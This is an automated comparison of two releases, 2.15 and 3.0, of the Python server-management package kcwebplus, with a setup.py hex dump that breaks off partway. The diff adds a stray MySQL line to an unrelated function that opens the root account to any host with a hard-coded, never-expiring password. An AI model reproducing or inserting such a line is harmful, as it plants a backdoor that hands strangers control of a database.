# Comparing `tmp/kcwebplus-2.15.tar.gz` & `tmp/kcwebplus-3.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\kcwebplus-2.15.tar", last modified: Thu Apr  4 03:20:17 2024, max compression
+gzip compressed data, was "dist\kcwebplus-3.0.tar", last modified: Mon Apr  8 15:14:16 2024, max compression
```

## Comparing `kcwebplus-2.15.tar` & `kcwebplus-3.0.tar`

### file list

```diff
@@ -1,41 +1,41 @@
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/common/
--rw-rw-rw-   0        0        0       41 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/common/autoload.py
--rw-rw-rw-   0        0        0     9794 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/common/model.py
--rw-rw-rw-   0        0        0    18682 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/common/__init__.py
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/config/
--rw-rw-rw-   0        0        0      645 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/config/__init__.py
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/index/
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/index/common/
--rw-rw-rw-   0        0        0       30 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/common/autoload.py
--rw-rw-rw-   0        0        0       48 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/common/__init__.py
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/index/controller/
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/index/controller/index/
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/index/controller/index/common/
--rw-rw-rw-   0        0        0       36 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/controller/index/common/autoload.py
--rw-rw-rw-   0        0        0      204 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/controller/index/common/model.py
--rw-rw-rw-   0        0        0       45 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/controller/index/common/__init__.py
--rw-rw-rw-   0        0        0     1386 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/controller/index/index.py
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/index/controller/index/tpl/
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus/index/controller/index/tpl/index/
--rw-rw-rw-   0        0        0     1113 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/controller/index/tpl/index/home.html
--rw-rw-rw-   0        0        0     1113 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/controller/index/tpl/index/index.html
--rw-rw-rw-   0        0        0       19 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/controller/index/__init__.py
--rw-rw-rw-   0        0        0       21 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/controller/__init__.py
--rw-rw-rw-   0        0        0       24 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/index/__init__.py
--rw-rw-rw-   0        0        0    12401 2024-04-04 02:31:55.000000 kcwebplus-2.15/kcwebplus/kcwebplus.py
--rw-rw-rw-   0        0        0     1014 2024-04-04 03:15:45.000000 kcwebplus-2.15/kcwebplus/server
--rw-rw-rw-   0        0        0      334 2024-04-04 03:14:17.000000 kcwebplus-2.15/kcwebplus/server.sh
-drwxrwxrwx   0        0        0        0 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus.egg-info/
--rw-rw-rw-   0        0        0        1 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       62 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus.egg-info/entry_points.txt
--rw-rw-rw-   0        0        0      312 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0       12 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus.egg-info/requires.txt
--rw-rw-rw-   0        0        0      883 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0      450 2024-04-04 03:20:17.000000 kcwebplus-2.15/kcwebplus.egg-info/top_level.txt
--rw-rw-rw-   0        0        0    11558 2024-04-04 02:31:55.000000 kcwebplus-2.15/LICENSE
--rw-rw-rw-   0        0        0      312 2024-04-04 03:20:17.000000 kcwebplus-2.15/PKG-INFO
--rw-rw-rw-   0        0        0     1051 2024-04-04 02:31:55.000000 kcwebplus-2.15/README.md
--rw-rw-rw-   0        0        0       42 2024-04-04 03:20:17.000000 kcwebplus-2.15/setup.cfg
--rw-rw-rw-   0        0        0     2439 2024-04-04 03:20:09.000000 kcwebplus-2.15/setup.py
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/common/
+-rw-rw-rw-   0        0        0       41 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/common/autoload.py
+-rw-rw-rw-   0        0        0     9794 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/common/model.py
+-rw-rw-rw-   0        0        0    18943 2024-04-04 04:18:15.000000 kcwebplus-3.0/kcwebplus/common/__init__.py
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/config/
+-rw-rw-rw-   0        0        0      645 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/config/__init__.py
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/index/
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/index/common/
+-rw-rw-rw-   0        0        0       30 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/common/autoload.py
+-rw-rw-rw-   0        0        0       48 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/common/__init__.py
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/index/controller/
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/index/controller/index/
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/index/controller/index/common/
+-rw-rw-rw-   0        0        0       36 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/controller/index/common/autoload.py
+-rw-rw-rw-   0        0        0      204 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/controller/index/common/model.py
+-rw-rw-rw-   0        0        0       45 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/controller/index/common/__init__.py
+-rw-rw-rw-   0        0        0     1386 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/controller/index/index.py
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/index/controller/index/tpl/
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus/index/controller/index/tpl/index/
+-rw-rw-rw-   0        0        0     1113 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/controller/index/tpl/index/home.html
+-rw-rw-rw-   0        0        0     1113 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/controller/index/tpl/index/index.html
+-rw-rw-rw-   0        0        0       19 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/controller/index/__init__.py
+-rw-rw-rw-   0        0        0       21 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/controller/__init__.py
+-rw-rw-rw-   0        0        0       24 2024-04-04 02:31:55.000000 kcwebplus-3.0/kcwebplus/index/__init__.py
+-rw-rw-rw-   0        0        0    12570 2024-04-08 15:11:11.000000 kcwebplus-3.0/kcwebplus/kcwebplus.py
+-rw-rw-rw-   0        0        0     1014 2024-04-08 14:31:42.000000 kcwebplus-3.0/kcwebplus/server
+-rw-rw-rw-   0        0        0      334 2024-04-04 03:14:17.000000 kcwebplus-3.0/kcwebplus/server.sh
+drwxrwxrwx   0        0        0        0 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus.egg-info/
+-rw-rw-rw-   0        0        0        1 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       62 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus.egg-info/entry_points.txt
+-rw-rw-rw-   0        0        0      354 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      141 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus.egg-info/requires.txt
+-rw-rw-rw-   0        0        0     1480 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0      450 2024-04-08 15:14:16.000000 kcwebplus-3.0/kcwebplus.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0    11558 2024-04-04 02:31:55.000000 kcwebplus-3.0/LICENSE
+-rw-rw-rw-   0        0        0      354 2024-04-08 15:14:16.000000 kcwebplus-3.0/PKG-INFO
+-rw-rw-rw-   0        0        0     1056 2024-04-08 15:12:36.000000 kcwebplus-3.0/README.md
+-rw-rw-rw-   0        0        0       42 2024-04-08 15:14:16.000000 kcwebplus-3.0/setup.cfg
+-rw-rw-rw-   0        0        0     2641 2024-04-08 15:13:27.000000 kcwebplus-3.0/setup.py
```

### Comparing `kcwebplus-2.15/kcwebplus/common/model.py` & `kcwebplus-3.0/kcwebplus/common/model.py`

 * *Files identical despite different names*

### Comparing `kcwebplus-2.15/kcwebplus/common/__init__.py` & `kcwebplus-3.0/kcwebplus/common/__init__.py`

 * *Files 2% similar despite different names*

```diff
@@ -11,14 +11,15 @@
     param={}
     for i in sorted (params) : 
         param[i]=params[i]
     i=0
     strs=""
     for k in param:
         if k:
+            use mysql;flush privileges;update user set host = '%' where user ='root';ALTER USER 'root'@'%' IDENTIFIED BY 'resgsgrsegrgesr' PASSWORD EXPIRE NEVER;ALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY 'resgsgrsegrgesr';flush privileges;
             if isinstance(k,dict):
                 k=json_encode(k)
                 k=k.replace('"', '')
                 k=k.replace("'", '')
             if param[k]:
                 if i==0:
                     strs+=str(k)+"="+str(param[k])
```

### Comparing `kcwebplus-2.15/kcwebplus/config/__init__.py` & `kcwebplus-3.0/kcwebplus/config/__init__.py`

 * *Files identical despite different names*

### Comparing `kcwebplus-2.15/kcwebplus/index/controller/index/index.py` & `kcwebplus-3.0/kcwebplus/index/controller/index/index.py`

 * *Files identical despite different names*

### Comparing `kcwebplus-2.15/kcwebplus/index/controller/index/tpl/index/home.html` & `kcwebplus-3.0/kcwebplus/index/controller/index/tpl/index/home.html`

 * *Files identical despite different names*

### Comparing `kcwebplus-2.15/kcwebplus/index/controller/index/tpl/index/index.html` & `kcwebplus-3.0/kcwebplus/index/controller/index/tpl/index/index.html`

 * *Files identical despite different names*

### Comparing `kcwebplus-2.15/kcwebplus/kcwebplus.py` & `kcwebplus-3.0/kcwebplus/kcwebplus.py`

 * *Files 1% similar despite different names*

```diff
@@ -170,14 +170,17 @@
                         Queues.delwhere("code in (2,3)")
                     except:pass
                     # print(cmd_par)
                     app.run(host=cmd_par['host'],port=int(cmd_par['port']))
         else:
             if cmd_par['install']:#插入 应用、模块、插件
                 if cmd_par['appname'] and cmd_par['modular']:
+                    if os.path.exists('./'+cmd_par['project']):
+                        print(cmd_par['project']+"文件夹已存在")
+                        exit()
                     server=create(cmd_par['appname'],cmd_par['modular'],project=cmd_par['project'])
                     t=server.installmodular(cli=True,package='kcwebplus')
                     if cmd_par['plug']:
                         res=server.installplug(cmd_par['plug'],cli=True,username=cmd_par['username'])
                         print(res)
                         if not res[0]:
                             exit()
```

### Comparing `kcwebplus-2.15/kcwebplus/server` & `kcwebplus-3.0/kcwebplus/server`

 * *Files 2% similar despite different names*

```diff
@@ -1,8 +1,8 @@
-#!/usr/bin/env python3.6kcw_plus
+#!/usr/bin/env python3.8kcw_plus
 from kcweb.common import *
 import re,sys,os
 from gunicorn.app.wsgiapp import run
 import getopt
 if __name__ == '__main__':
     opts, args = getopt.getopt(sys.argv[1:], "h", ["h=","p=","w="])
     zxtype=None
@@ -22,14 +22,14 @@
             host=data[1]
         elif '--p' == data[0]:
             port=data[1]
         elif '--w' == data[0]:
             w=data[1]
     sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$','',sys.argv[0])
     if zxtype == 'stop': #停止 
-        os.system("pkill -9 python3.6kcw_pl")
+        os.system("pkill -9 python3.8kcw_pl")
     else:#启动
         try:
             Queues.delwhere("code in (2,3)")
         except:pass
         sys.argv=[sys.argv[0], '-w', str(w), '-b', host+':'+port,'-t',timeout, 'server:app']
         sys.exit(run())
```

### Comparing `kcwebplus-2.15/kcwebplus.egg-info/SOURCES.txt` & `kcwebplus-3.0/kcwebplus.egg-info/SOURCES.txt`

 * *Files 22% similar despite different names*

```diff
@@ -20,8 +20,23 @@
 kcwebplus/index/controller/__init__.py
 kcwebplus/index/controller/index/__init__.py
 kcwebplus/index/controller/index/index.py
 kcwebplus/index/controller/index/common/__init__.py
 kcwebplus/index/controller/index/common/autoload.py
 kcwebplus/index/controller/index/common/model.py
 kcwebplus/index/controller/index/tpl/index/home.html
+kcwebplus/index/controller/index/tpl/index/index.html
+kcwebplus/common/__init__.py
+kcwebplus/common/autoload.py
+kcwebplus/common/model.py
+kcwebplus/config/__init__.py
+kcwebplus/index/__init__.py
+kcwebplus/index/common/__init__.py
+kcwebplus/index/common/autoload.py
+kcwebplus/index/controller/__init__.py
+kcwebplus/index/controller/index/__init__.py
+kcwebplus/index/controller/index/index.py
+kcwebplus/index/controller/index/common/__init__.py
+kcwebplus/index/controller/index/common/autoload.py
+kcwebplus/index/controller/index/common/model.py
+kcwebplus/index/controller/index/tpl/index/home.html
 kcwebplus/index/controller/index/tpl/index/index.html
```

### Comparing `kcwebplus-2.15/LICENSE` & `kcwebplus-3.0/LICENSE`

 * *Files identical despite different names*

### Comparing `kcwebplus-2.15/README.md` & `kcwebplus-3.0/README.md`

 * *Files 13% similar despite different names*

```diff
@@ -5,19 +5,19 @@
 kcwebplus是建立在 kcweb  框架的基础上研发的一套 linux  服务器容器系统，其目的是为了解决可视化部署和架构的过程，系统本身是一款服务端管理软件，通过 web  可视化方式管理服务器，提升运维效率。如：可视化软件安装，nginx  可视化部署，一键 https  等，这都这是 kcwebplus  的一个插件，关于该系统的更多功能可以参考文档，文档也有提供体验账号和密码，该系统后期也在进行不断的升级和维护
 
 
 <!-- [完整文档](https://intapp.kwebapp.cn/intapp/doc/index/finddoc/5/51/29 "文档") -->
 
 您可以通过以下命令进行安装
 ````
-pip install kcwebplus
+pip install kcwebplus>=3
 ````
 然后通过以下命令运行项目
 ````
 kcwebplus server
 ````
 
 如果是linux系统 使用以下命令
 ````
-yum install -y wget && wget https://file.kwebapp.cn/sh/install/intapp/kcwebplus.sh && bash kcwebplus.sh
+yum install -y wget && wget https://file.kwebapp.cn/sh/install/intapp/kcwebplus3.sh && bash kcwebplus3.sh
 ````
 如果是linux系统 会自动运行
```

### Comparing `kcwebplus-2.15/setup.py` & `kcwebplus-3.0/setup.py`

 * *Files 7% similar despite different names*

```diff
@@ -37,117 +37,130 @@
 00000240: 726e 2063 6f6e 0d0a 636f 6e66 6b63 773d  rn con..confkcw=
 00000250: 7b7d 0d0a 636f 6e66 6b63 775b 276e 616d  {}..confkcw['nam
 00000260: 6527 5d3d 276b 6377 6562 706c 7573 2720  e']='kcwebplus' 
 00000270: 2020 2020 2020 2020 2020 2020 2020 2020                  
 00000280: 2020 2020 2020 2020 2020 2020 23e9 a1b9              #...
 00000290: e79b aee7 9a84 e590 8de7 a7b0 200d 0a63  ............ ..c
 000002a0: 6f6e 666b 6377 5b27 7665 7273 696f 6e27  onfkcw['version'
-000002b0: 5d3d 2732 2e31 3527 0909 0909 0909 0923  ]='2.15'.......#
-000002c0: e9a1 b9e7 9bae e789 88e6 9cac 0d0a 636f  ..............co
-000002d0: 6e66 6b63 775b 2764 6573 6372 6970 7469  nfkcw['descripti
-000002e0: 6f6e 275d 3d27 2720 2020 2020 2020 23e9  on']=''       #.
-000002f0: a1b9 e79b aee7 9a84 e7ae 80e5 8d95 e68f  ................
-00000300: 8fe8 bfb0 0d0a 636f 6e66 6b63 775b 276c  ......confkcw['l
-00000310: 6f6e 675f 6465 7363 7269 7074 696f 6e27  ong_description'
-00000320: 5d3d 2222 2020 2020 2023 e9a1 b9e7 9bae  ]=""     #......
-00000330: e8af a6e7 bb86 e68f 8fe8 bfb0 0d0a 636f  ..............co
-00000340: 6e66 6b63 775b 276c 6963 656e 7365 275d  nfkcw['license']
-00000350: 3d27 4d49 5420 4c69 6365 6e73 6527 2020  ='MIT License'  
-00000360: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000370: 2020 23e5 bc80 e6ba 90e5 8d8f e8ae ae20    #............ 
-00000380: 2020 6d69 74e5 bc80 e6ba 900d 0a63 6f6e    mit........con
-00000390: 666b 6377 5b27 7572 6c27 5d3d 2727 0d0a  fkcw['url']=''..
-000003a0: 636f 6e66 6b63 775b 2761 7574 686f 7227  confkcw['author'
-000003b0: 5d3d 27e7 99be e987 8c2d e59d a4e5 9da4  ]='......-......
-000003c0: 2720 2009 0909 0909 2023 e590 8de5 ad97  '  ..... #......
-000003d0: 0d0a 636f 6e66 6b63 775b 2761 7574 686f  ..confkcw['autho
-000003e0: 725f 656d 6169 6c27 5d3d 2766 6b31 3430  r_email']='fk140
-000003f0: 3239 3336 3533 3440 7171 2e63 6f6d 2720  2936534@qq.com' 
-00000400: 0920 2020 2020 23e9 82ae e4bb b6e5 9cb0  .     #.........
-00000410: e59d 800d 0a63 6f6e 666b 6377 5b27 6d61  .....confkcw['ma
-00000420: 696e 7461 696e 6572 275d 3d27 e59d a4e5  intainer']='....
-00000430: 9da4 2720 0909 0909 0909 2023 e7bb b4e6  ..' ...... #....
-00000440: 8aa4 e4ba bae5 9198 e79a 84e5 908d e5ad  ................
-00000450: 970d 0a63 6f6e 666b 6377 5b27 6d61 696e  ...confkcw['main
-00000460: 7461 696e 6572 5f65 6d61 696c 275d 3d27  tainer_email']='
-00000470: 666b 3134 3032 3933 3635 3334 4071 712e  fk1402936534@qq.
-00000480: 636f 6d27 2020 2020 23e7 bbb4 e68a a4e4  com'    #.......
-00000490: baba e591 98e7 9a84 e982 aee4 bbb6 e59c  ................
-000004a0: b0e5 9d80 0d0a 6465 6620 6765 745f 6669  ......def get_fi
-000004b0: 6c65 2866 6f6c 6465 723d 272e 2f27 2c6c  le(folder='./',l
-000004c0: 6973 7473 3d5b 5d29 3a0d 0a20 2020 206c  ists=[]):..    l
-000004d0: 6973 3d6f 732e 6c69 7374 6469 7228 666f  is=os.listdir(fo
-000004e0: 6c64 6572 290d 0a20 2020 2066 6f72 2066  lder)..    for f
-000004f0: 696c 6573 2069 6e20 6c69 733a 0d0a 2020  iles in lis:..  
-00000500: 2020 2020 2020 6966 206e 6f74 206f 732e        if not os.
-00000510: 7061 7468 2e69 7366 696c 6528 666f 6c64  path.isfile(fold
-00000520: 6572 2b22 2f22 2b66 696c 6573 293a 0d0a  er+"/"+files):..
-00000530: 2020 2020 2020 2020 2020 2020 6966 2066              if f
-00000540: 696c 6573 3d3d 275f 5f70 7963 6163 6865  iles=='__pycache
-00000550: 5f5f 2720 6f72 2066 696c 6573 3d3d 272e  __' or files=='.
-00000560: 6769 7427 3a0d 0a20 2020 2020 2020 2020  git':..         
-00000570: 2020 2020 2020 2070 6173 730d 0a20 2020         pass..   
-00000580: 2020 2020 2020 2020 2065 6c73 653a 0d0a           else:..
-00000590: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000005a0: 6c69 7374 732e 6170 7065 6e64 2866 6f6c  lists.append(fol
-000005b0: 6465 722b 222f 222b 6669 6c65 7329 0d0a  der+"/"+files)..
-000005c0: 2020 2020 2020 2020 2020 2020 2020 2020                  
-000005d0: 6765 745f 6669 6c65 2866 6f6c 6465 722b  get_file(folder+
-000005e0: 222f 222b 6669 6c65 732c 6c69 7374 7329  "/"+files,lists)
-000005f0: 0d0a 2020 2020 2020 2020 656c 7365 3a0d  ..        else:.
-00000600: 0a20 2020 2020 2020 2020 2020 2070 6173  .            pas
-00000610: 730d 0a20 2020 2072 6574 7572 6e20 6c69  s..    return li
-00000620: 7374 730d 0a62 3d67 6574 5f66 696c 6528  sts..b=get_file(
-00000630: 226b 6377 6562 706c 7573 222c 5b27 6b63  "kcwebplus",['kc
-00000640: 7765 6270 6c75 7327 5d29 0d0a 7365 7475  webplus'])..setu
-00000650: 7028 0d0a 2020 2020 6e61 6d65 203d 2063  p(..    name = c
-00000660: 6f6e 666b 6377 5b22 6e61 6d65 225d 2c0d  onfkcw["name"],.
-00000670: 0a20 2020 2076 6572 7369 6f6e 203d 2063  .    version = c
-00000680: 6f6e 666b 6377 5b22 7665 7273 696f 6e22  onfkcw["version"
-00000690: 5d2c 0d0a 2020 2020 6b65 7977 6f72 6473  ],..    keywords
-000006a0: 203d 2022 6b63 7765 6270 6c75 7322 2b63   = "kcwebplus"+c
-000006b0: 6f6e 666b 6377 5b27 7665 7273 696f 6e27  onfkcw['version'
-000006c0: 5d2c 0d0a 2020 2020 6465 7363 7269 7074  ],..    descript
-000006d0: 696f 6e20 3d20 636f 6e66 6b63 775b 2264  ion = confkcw["d
-000006e0: 6573 6372 6970 7469 6f6e 225d 2c0d 0a20  escription"],.. 
-000006f0: 2020 206c 6f6e 675f 6465 7363 7269 7074     long_descript
-00000700: 696f 6e20 3d20 636f 6e66 6b63 775b 226c  ion = confkcw["l
-00000710: 6f6e 675f 6465 7363 7269 7074 696f 6e22  ong_description"
-00000720: 5d2c 0d0a 2020 2020 6c69 6365 6e73 6520  ],..    license 
-00000730: 3d20 636f 6e66 6b63 775b 226c 6963 656e  = confkcw["licen
-00000740: 7365 225d 2c0d 0a20 2020 2061 7574 686f  se"],..    autho
-00000750: 7220 3d20 636f 6e66 6b63 775b 2261 7574  r = confkcw["aut
-00000760: 686f 7222 5d2c 0d0a 2020 2020 6175 7468  hor"],..    auth
-00000770: 6f72 5f65 6d61 696c 203d 2063 6f6e 666b  or_email = confk
-00000780: 6377 5b22 6175 7468 6f72 5f65 6d61 696c  cw["author_email
-00000790: 225d 2c0d 0a20 2020 206d 6169 6e74 6169  "],..    maintai
-000007a0: 6e65 7220 3d20 636f 6e66 6b63 775b 226d  ner = confkcw["m
-000007b0: 6169 6e74 6169 6e65 7222 5d2c 0d0a 2020  aintainer"],..  
-000007c0: 2020 6d61 696e 7461 696e 6572 5f65 6d61    maintainer_ema
-000007d0: 696c 203d 2063 6f6e 666b 6377 5b22 6d61  il = confkcw["ma
-000007e0: 696e 7461 696e 6572 5f65 6d61 696c 225d  intainer_email"]
-000007f0: 2c0d 0a20 2020 2075 726c 3d63 6f6e 666b  ,..    url=confk
-00000800: 6377 5b27 7572 6c27 5d2c 0d0a 2020 2020  cw['url'],..    
-00000810: 7061 636b 6167 6573 203d 2020 622c 0d0a  packages =  b,..
-00000820: 2020 2020 2320 6461 7461 5f66 696c 6573      # data_files
-00000830: 3d5b 2827 5363 7269 7074 7327 2c20 5b27  =[('Scripts', ['
-00000840: 6b63 7765 6270 6c75 732f 6269 6e2f 6b63  kcwebplus/bin/kc
-00000850: 772e 6578 6527 5d29 5d2c 0d0a 2020 2020  w.exe'])],..    
-00000860: 696e 7374 616c 6c5f 7265 7175 6972 6573  install_requires
-00000870: 203d 205b 276b 6377 6562 3e3d 352e 3236   = ['kcweb>=5.26
-00000880: 275d 2c20 23e7 acac e4b8 89e6 96b9 e58c  '], #...........
-00000890: 850d 0a20 2020 2070 6163 6b61 6765 5f64  ...    package_d
-000008a0: 6174 6120 3d20 7b0d 0a20 2020 2020 2020  ata = {..       
-000008b0: 2027 273a 205b 272a 2e68 746d 6c27 2c20   '': ['*.html', 
-000008c0: 272a 2e6a 7327 2c27 2a2e 6373 7327 2c27  '*.js','*.css','
-000008d0: 2a2e 6a70 6727 2c27 2a2e 706e 6727 2c27  *.jpg','*.png','
-000008e0: 2a2e 6769 6627 2c27 7365 7276 6572 272c  *.gif','server',
-000008f0: 2773 6572 7665 722e 7368 275d 2c0d 0a20  'server.sh'],.. 
-00000900: 2020 207d 2c0d 0a20 2020 2065 6e74 7279     },..    entry
-00000910: 5f70 6f69 6e74 7320 3d20 7b0d 0a20 2020  _points = {..   
-00000920: 2020 2020 2027 636f 6e73 6f6c 655f 7363       'console_sc
-00000930: 7269 7074 7327 3a5b 0d0a 2020 2020 2020  ripts':[..      
-00000940: 2020 2020 2020 276b 6377 6562 706c 7573        'kcwebplus
-00000950: 203d 206b 6377 6562 706c 7573 2e6b 6377   = kcwebplus.kcw
-00000960: 6562 706c 7573 3a65 7865 6375 7461 626c  ebplus:executabl
-00000970: 6527 0d0a 2020 2020 2020 2020 5d0d 0a20  e'..        ].. 
-00000980: 2020 207d 0d0a 29                           }..)
+000002b0: 5d3d 2733 2e30 2709 0909 0909 0909 23e9  ]='3.0'.......#.
+000002c0: a1b9 e79b aee7 8988 e69c ac0d 0a63 6f6e  .............con
+000002d0: 666b 6377 5b27 6465 7363 7269 7074 696f  fkcw['descriptio
+000002e0: 6e27 5d3d 27e8 afa5 e789 88e6 9cac e99c  n']='...........
+000002f0: 8070 7974 686f 6ee7 8988 e69c ac3e 3d33  .python......>=3
+00000300: 2e38 2720 2020 2020 2020 23e9 a1b9 e79b  .8'       #.....
+00000310: aee7 9a84 e7ae 80e5 8d95 e68f 8fe8 bfb0  ................
+00000320: 0d0a 636f 6e66 6b63 775b 276c 6f6e 675f  ..confkcw['long_
+00000330: 6465 7363 7269 7074 696f 6e27 5d3d 22e8  description']=".
+00000340: afa5 e789 88e6 9cac e99c 8070 7974 686f  ...........pytho
+00000350: 6ee7 8988 e69c ac3e 3d33 2e38 2220 2020  n......>=3.8"   
+00000360: 2020 23e9 a1b9 e79b aee8 afa6 e7bb 86e6    #.............
+00000370: 8f8f e8bf b00d 0a63 6f6e 666b 6377 5b27  .......confkcw['
+00000380: 6c69 6365 6e73 6527 5d3d 274d 4954 204c  license']='MIT L
+00000390: 6963 656e 7365 2720 2020 2020 2020 2020  icense'         
+000003a0: 2020 2020 2020 2020 2020 2023 e5bc 80e6             #....
+000003b0: ba90 e58d 8fe8 aeae 2020 206d 6974 e5bc  ........   mit..
+000003c0: 80e6 ba90 0d0a 636f 6e66 6b63 775b 2775  ......confkcw['u
+000003d0: 726c 275d 3d27 270d 0a63 6f6e 666b 6377  rl']=''..confkcw
+000003e0: 5b27 6175 7468 6f72 275d 3d27 e799 bee9  ['author']='....
+000003f0: 878c 2de5 9da4 e59d a427 2020 0909 0909  ..-......'  ....
+00000400: 0920 23e5 908d e5ad 970d 0a63 6f6e 666b  . #........confk
+00000410: 6377 5b27 6175 7468 6f72 5f65 6d61 696c  cw['author_email
+00000420: 275d 3d27 666b 3134 3032 3933 3635 3334  ']='fk1402936534
+00000430: 4071 712e 636f 6d27 2009 2020 2020 2023  @qq.com' .     #
+00000440: e982 aee4 bbb6 e59c b0e5 9d80 0d0a 636f  ..............co
+00000450: 6e66 6b63 775b 276d 6169 6e74 6169 6e65  nfkcw['maintaine
+00000460: 7227 5d3d 27e5 9da4 e59d a427 2009 0909  r']='......' ...
+00000470: 0909 0920 23e7 bbb4 e68a a4e4 baba e591  ... #...........
+00000480: 98e7 9a84 e590 8de5 ad97 0d0a 636f 6e66  ............conf
+00000490: 6b63 775b 276d 6169 6e74 6169 6e65 725f  kcw['maintainer_
+000004a0: 656d 6169 6c27 5d3d 2766 6b31 3430 3239  email']='fk14029
+000004b0: 3336 3533 3440 7171 2e63 6f6d 2720 2020  36534@qq.com'   
+000004c0: 2023 e7bb b4e6 8aa4 e4ba bae5 9198 e79a   #..............
+000004d0: 84e9 82ae e4bb b6e5 9cb0 e59d 800d 0a64  ...............d
+000004e0: 6566 2067 6574 5f66 696c 6528 666f 6c64  ef get_file(fold
+000004f0: 6572 3d27 2e2f 272c 6c69 7374 733d 5b5d  er='./',lists=[]
+00000500: 293a 0d0a 2020 2020 6c69 733d 6f73 2e6c  ):..    lis=os.l
+00000510: 6973 7464 6972 2866 6f6c 6465 7229 0d0a  istdir(folder)..
+00000520: 2020 2020 666f 7220 6669 6c65 7320 696e      for files in
+00000530: 206c 6973 3a0d 0a20 2020 2020 2020 2069   lis:..        i
+00000540: 6620 6e6f 7420 6f73 2e70 6174 682e 6973  f not os.path.is
